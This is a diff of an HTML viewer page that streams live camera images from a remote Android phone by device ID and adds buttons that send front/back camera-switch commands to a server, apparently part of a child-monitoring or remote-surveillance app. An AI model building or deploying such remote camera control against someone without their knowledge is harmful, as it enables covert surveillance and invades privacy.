@@ -21,21 +21,22 @@
         /* Video Container */
         #camContainer {
             position: relative;
-            width: 100%; max-width: 600px;
+            width: 100%; max-width: 500px;
             aspect-ratio: 9/16;
             background: #111;
             border: 2px solid #333;
-            border-radius: 15px;
+            border-radius: 20px;
             display: flex; align-items: center; justify-content: center;
             overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.15);
         }
 
         /* Image Element (Stream) */
         #camStream {
             width: 100%; height: 100%;
             object-fit: cover;
-            display: none; /* JS will show this when data arrives */
+            display: none; 
+            transform: rotate(90deg); /* Adjust if needed based on phone orientation */
         }
 
         /* Loading / Error State */
@@ -43,6 +44,7 @@
             text-align: center;
             display: flex; flex-direction: column; align-items: center;
             gap: 10px;
+            z-index: 5;
         }
         .spinner {
             width: 40px; height: 40px;
@@ -53,34 +55,84 @@
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
+        /* Top Bar (Back Button) */
+        .top-bar {
+            position: absolute; top: 20px; left: 20px; z-index: 100;
+        }
         .back-btn {
-            position: absolute; top: 20px; left: 20px;
-            background: rgba(255,255,255,0.1);
-            padding: 10px 15px; border-radius: 8px;
+            background: rgba(0,0,0,0.6);
+            padding: 10px 15px; border-radius: 30px;
             color: #fff; text-decoration: none;
             backdrop-filter: blur(5px);
             border: 1px solid rgba(255,255,255,0.2);
+            font-size: 0.9rem;
+            display: flex; align-items: center; gap: 8px;
         }
+
+        /* Bottom Controls (Switch Camera) */
+        .controls-bar {
+            position: absolute; bottom: 20px;
+            display: flex; gap: 15px;
+            z-index: 100;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 20px;
+            border-radius: 40px;
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .cam-btn {
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 10px;
+            border-radius: 50%;
+            transition: 0.2s;
+            width: 50px; height: 50px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .cam-btn:hover { background: rgba(255, 255, 255, 0.2); }
+        .cam-btn:active { transform: scale(0.9); }
+        
+        .cam-btn.active { color: #00f3ff; text-shadow: 0 0 10px #00f3ff; }
+
     </style>
 </head>
 <body>
 
-    <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
+    <div class="top-bar">
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Dashboard</a>
+    </div>
 
     <div id="camContainer">
         <img id="camStream" src="" alt="Live Feed">
         
         <div id="statusBox" class="status-msg">
             <div class="spinner"></div>
-            <h3 id="statusText">Connecting to Server...</h3>
+            <h3 id="statusText">Connecting...</h3>
             <small style="color: #aaa; font-size: 0.8rem;" id="debugInfo">Waiting for ID...</small>
+        </div>
+
+        <div class="controls-bar">
+            <button class="cam-btn" onclick="switchCamera('CAM_FRONT')" title="Front Camera">
+                <i class="fa-solid fa-user"></i>
+            </button>
+            
+            <button class="cam-btn" onclick="stopCam()" title="Stop / Refresh" style="color: #ff4444;">
+                <i class="fa-solid fa-stop"></i>
+            </button>
+
+            <button class="cam-btn" onclick="switchCamera('CAM_BACK')" title="Back Camera">
+                <i class="fa-solid fa-camera"></i>
+            </button>
         </div>
     </div>
 
     <script>
-        const API_BASE = 'https://child-v9no.onrender.com'; // Server URL
+        const API_BASE = 'https://child-v9no.onrender.com'; 
         
-        // URL se Device ID nikalo
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
 
@@ -90,48 +142,57 @@
         const debugInfo = document.getElementById('debugInfo');
 
         if (!DEVICE_ID) {
-            statusText.innerText = "Error: No Device ID Found";
-            debugInfo.innerText = "Please go back and enter ID.";
+            statusText.innerText = "Error: No Device ID";
             document.querySelector('.spinner').style.display = 'none';
         } else {
-            startStream();
+            startStreamListener();
         }
 
-        function startStream() {
-            statusText.innerText = "Waiting for Camera...";
+        function startStreamListener() {
             debugInfo.innerText = `Device: ${DEVICE_ID}`;
-
-            // Socket connection
             const socket = io(API_BASE);
 
             socket.on('connect', () => {
                 console.log("Connected to Server");
-                // Join the room for this specific device
                 socket.emit('join-web', DEVICE_ID);
-                debugInfo.innerText = "Server Connected. Waiting for phone data...";
+                debugInfo.innerText = "Connected. Waiting for video...";
             });
 
-            // IMPORTANT: Ye event name 'cam-image' server ke hisab se hona chahiye.
-            // Agar server 'image' ya 'stream' bhej raha hai to niche change karna padega.
+            // Receive Image Data
             socket.on('cam-image', (data) => {
                 if(data && data.image) {
-                    // Agar data aa raha hai:
-                    statusBox.style.display = 'none';  // Loader chupao
-                    imgElement.style.display = 'block'; // Image dikhao
-                    
-                    // Image update karo
+                    statusBox.style.display = 'none';
+                    imgElement.style.display = 'block';
                     imgElement.src = "data:image/jpeg;base64," + data.image;
-                } else {
-                    console.log("Null data received");
                 }
             });
 
             socket.on('disconnect', () => {
-                statusBox.style.display = 'flex';
-                imgElement.style.display = 'none';
                 statusText.innerText = "Disconnected";
-                statusText.style.color = "#ff4444";
             });
+        }
+
+        // 🔥 Function to Switch Camera
+        function switchCamera(command) {
+            if(!DEVICE_ID) return;
+
+            // UI Feedback
+            imgElement.style.display = 'none';
+            statusBox.style.display = 'flex';
+            statusText.innerText = command === 'CAM_FRONT' ? "Switching to Front..." : "Switching to Back...";
+            
+            // Send Command to Android
+            fetch(`${API_BASE}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: command })
+            })
+            .then(res => console.log("Camera Switch Sent: " + command))
+            .catch(err => console.error("Error switching", err));
+        }
+
+        function stopCam() {
+             location.reload(); // Simple refresh for now to restart connection
         }
     </script>
 </body>
